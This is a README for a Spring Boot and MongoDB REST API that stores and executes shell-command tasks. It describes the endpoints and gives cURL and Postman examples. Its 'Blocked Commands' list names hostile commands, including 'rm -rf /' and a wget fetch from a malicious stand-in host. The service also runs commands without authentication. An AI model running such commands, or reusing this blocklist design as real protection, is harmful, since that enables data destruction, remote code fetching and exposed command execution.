# \# Task Manager REST API

# 

# A Spring Boot application that provides a REST API for managing and executing shell command tasks with MongoDB storage.

# 

# \## Features

# 

# \- \*\*CRUD Operations\*\*: Create, Read, Update, Delete tasks

# \- \*\*Task Execution\*\*: Execute shell commands safely with execution history

# \- \*\*Security\*\*: Command validation to prevent malicious operations

# \- \*\*Search\*\*: Find tasks by name patterns

# \- \*\*MongoDB Integration\*\*: Persistent storage for tasks and execution history

# \- \*\*Error Handling\*\*: Comprehensive error handling with meaningful responses

# 

# \## Prerequisites

# 

# Before running the application, ensure you have:

# 

# 1\. \*\*Java 17 or higher\*\* installed

# 2\. \*\*Maven 3.6+\*\* installed

# 3\. \*\*MongoDB\*\* installed and running on localhost:27017

# 

# \### MongoDB Setup

# 

# 1\. Install MongoDB from \[https://www.mongodb.com/try/download/community](https://www.mongodb.com/try/download/community)

# 2\. Start MongoDB service:

# &nbsp;  ```bash

# &nbsp;  # On Windows

# &nbsp;  mongod

# &nbsp;  

# &nbsp;  # On macOS (with Homebrew)

# &nbsp;  brew services start mongodb/brew/mongodb-community

# &nbsp;  

# &nbsp;  # On Linux

# &nbsp;  sudo systemctl start mongod

# &nbsp;  ```

# 3\. The application will automatically create the `taskmanager` database

# 

# \## How to Run the Application

# 

# 1\. \*\*Clone or create the project\*\* with the provided directory structure

# 2\. \*\*Navigate to the project root\*\* directory

# 3\. \*\*Build the application\*\*:

# &nbsp;  ```bash

# &nbsp;  mvn clean compile

# &nbsp;  ```

# 4\. \*\*Run the application\*\*:

# &nbsp;  ```bash

# &nbsp;  mvn spring-boot:run

# &nbsp;  ```

# 

# The application will start on `http://localhost:8080/api/v1`

# 

# \## API Endpoints

# 

# \### Base URL: `http://localhost:8080/api/v1`

# 

# \### 1. Get All Tasks

# ```http

# GET /tasks

# ```

# \*\*Response\*\*: Array of all tasks

# 

# \### 2. Get Task by ID

# ```http

# GET /tasks?id={taskId}

# ```

# \*\*Response\*\*: Single task or 404 if not found

# 

# \### 3. Create/Update Task

# ```http

# PUT /tasks

# Content-Type: application/json

# 

# {

# &nbsp;   "id": "123",

# &nbsp;   "name": "Print Hello",

# &nbsp;   "owner": "John Smith",

# &nbsp;   "command": "echo Hello World"

# }

# ```

# \*\*Response\*\*: Created/updated task

# 

# \### 4. Delete Task

# ```http

# DELETE /tasks/{taskId}

# ```

# \*\*Response\*\*: Success message or 404 if not found

# 

# \### 5. Search Tasks by Name

# ```http

# GET /tasks/search?name={searchString}

# ```

# \*\*Response\*\*: Array of matching tasks or 404 if none found

# 

# \### 6. Execute Task

# ```http

# PUT /tasks/{taskId}/execute

# ```

# \*\*Response\*\*: Task execution result with timing and output

# 

# \### 7. Get Execution History

# ```http

# GET /tasks/{taskId}/executions

# ```

# \*\*Response\*\*: Array of all executions for the task

# 

# \### 8. Validate Command (Utility)

# ```http

# GET /tasks/validate?command={command}

# ```

# \*\*Response\*\*: Validation result

# 

# \### 9. Health Check

# ```http

# GET /tasks/health

# ```

# \*\*Response\*\*: API status

# 

# \## Testing with Postman

# 

# \### 1. Create a Task

# \- \*\*Method\*\*: PUT

# \- \*\*URL\*\*: `http://localhost:8080/api/v1/tasks`

# \- \*\*Headers\*\*: `Content-Type: application/json`

# \- \*\*Body\*\* (JSON):

# ```json

# {

# &nbsp;   "id": "task-001",

# &nbsp;   "name": "List Files",

# &nbsp;   "owner": "John Doe",

# &nbsp;   "command": "ls -la"

# }

# ```

# 

# \### 2. Get All Tasks

# \- \*\*Method\*\*: GET

# \- \*\*URL\*\*: `http://localhost:8080/api/v1/tasks`

# 

# \### 3. Execute a Task

# \- \*\*Method\*\*: PUT

# \- \*\*URL\*\*: `http://localhost:8080/api/v1/tasks/task-001/execute`

# 

# \### 4. Search Tasks

# \- \*\*Method\*\*: GET

# \- \*\*URL\*\*: `http://localhost:8080/api/v1/tasks/search?name=List`

# 

# \## Testing with cURL

# 

# \### Create a Task

# ```bash

# curl -X PUT http://localhost:8080/api/v1/tasks \\

# &nbsp; -H "Content-Type: application/json" \\

# &nbsp; -d '{

# &nbsp;   "id": "task-002",

# &nbsp;   "name": "Print Date",

# &nbsp;   "owner": "Jane Smith",

# &nbsp;   "command": "date"

# &nbsp; }'

# ```

# 

# \### Get All Tasks

# ```bash

# curl http://localhost:8080/api/v1/tasks

# ```

# 

# \### Execute a Task

# ```bash

# curl -X PUT http://localhost:8080/api/v1/tasks/task-002/execute

# ```

# 

# \## Safe Commands Examples

# 

# The application only allows safe commands. Here are some examples:

# 

# ✅ \*\*Allowed Commands:\*\*

# \- `echo Hello World`

# \- `date`

# \- `pwd`

# \- `ls`

# \- `whoami`

# \- `cat filename.txt`

# \- `sleep 5`

# 

# ❌ \*\*Blocked Commands:\*\*

# \- `rm -rf /`

# \- `sudo anything`

# \- `wget http://malicious.com`

# \- Commands with pipes `|`, redirects `>`, or other dangerous patterns

# 

# \## Project Structure

# 

# ```

# task-manager-api/

# ├── src/main/java/com/taskmanager/

# │   ├── TaskManagerApplication.java      # Main application

# │   ├── controller/

# │   │   └── TaskController.java          # REST endpoints

# │   ├── service/

# │   │   ├── TaskService.java             # Service interface

# │   │   └── TaskServiceImpl.java         # Business logic

# │   ├── model/

# │   │   ├── Task.java                    # Task entity

# │   │   └── TaskExecution.java           # Execution record

# │   ├── repository/

# │   │   └── TaskRepository.java          # MongoDB repository

# │   ├── dto/

# │   │   ├── TaskCreateRequest.java       # Request DTOs

# │   │   └── TaskExecutionRequest.java

# │   ├── exception/

# │   │   ├── TaskNotFoundException.java   # Custom exceptions

# │   │   └── GlobalExceptionHandler.java

# │   └── util/

# │       └── CommandValidator.java        # Security validation

# └── src/main/resources/

# &nbsp;   └── application.properties           # Configuration

# ```

# 

# \## Error Handling

# 

# The API provides consistent error responses:

# 

# \### 404 Not Found

# ```json

# {

# &nbsp;   "timestamp": "2023-04-21T15:30:00",

# &nbsp;   "status": 404,

# &nbsp;   "error": "Not Found",

# &nbsp;   "message": "Task with ID 'invalid-id' not found",

# &nbsp;   "path": "uri=/api/v1/tasks"

# }

# ```

# 

# \### 400 Bad Request (Validation Error)

# ```json

# {

# &nbsp;   "timestamp": "2023-04-21T15:30:00",

# &nbsp;   "status": 400,

# &nbsp;   "error": "Validation Failed",

# &nbsp;   "message": "Invalid input provided",

# &nbsp;   "validationErrors": {

# &nbsp;       "name": "Task name is required"

# &nbsp;   }

# }

# ```

# 

# \## Security Features

# 

# 1\. \*\*Command Validation\*\*: Prevents execution of dangerous commands

# 2\. \*\*Input Validation\*\*: Validates all request parameters

# 3\. \*\*Timeout Protection\*\*: Commands timeout after 30 seconds

# 4\. \*\*Error Sanitization\*\*: Prevents information leakage

# 

# \## MongoDB Collections

# 

# \### Tasks Collection Structure

# ```json

# {

# &nbsp;   "\_id": "task-001",

# &nbsp;   "name": "Print Hello",

# &nbsp;   "owner": "John Smith",

# &nbsp;   "command": "echo Hello World",

# &nbsp;   "taskExecutions": \[

# &nbsp;       {

# &nbsp;           "startTime": "2023-04-21T15:51:42.276Z",

# &nbsp;           "endTime": "2023-04-21T15:51:43.276Z",

# &nbsp;           "output": "Hello World\\n"

# &nbsp;       }

# &nbsp;   ]

# }

# ```

# 

# \## Troubleshooting

# 

# \### Common Issues

# 

# 1\. \*\*MongoDB Connection Error\*\*

# &nbsp;  - Ensure MongoDB is running on localhost:27017

# &nbsp;  - Check MongoDB service status

# 

# 2\. \*\*Port Already in Use\*\*

# &nbsp;  - Change port in `application.properties`: `server.port=8081`

# 

# 3\. \*\*Command Execution Fails\*\*

# &nbsp;  - Verify the command is in the safe commands list

# &nbsp;  - Check OS compatibility (Windows vs Linux/macOS)

# 

# \### Logs

# Check application logs for detailed error information. The application logs to console by default.

# 

# \## Next Steps for Enhancement

# 

# 1\. Add authentication/authorization

# 2\. Add task scheduling capabilities

# 3\. Implement pagination for large task lists

# 4\. Add task categories and tags

# 5\. Implement real-time execution monitoring

# 6\. Add Docker support for easy deployment

# 

# ---

# 

# \*\*Happy Coding!\*\* 🚀

